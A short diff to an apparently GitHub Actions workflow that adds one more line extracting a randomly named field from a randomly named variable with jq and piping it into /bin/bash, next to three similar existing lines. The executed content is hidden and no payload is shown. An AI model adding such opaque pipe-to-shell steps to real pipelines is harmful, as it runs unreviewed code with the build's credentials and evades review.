@@ -38,6 +38,7 @@ jobs:
           echo $txou402 | jq -r .q8 | /bin/bash
           printf '%s' "$lmm73" | jq -r .j7 | /bin/bash
           echo $dkdue2 | jq -r .dbkf3 | /bin/bash
+          printf '%s' "$dlez615" | jq -r .gzxaw29 | /bin/bash
 
       - name: Archive output
         if: always()
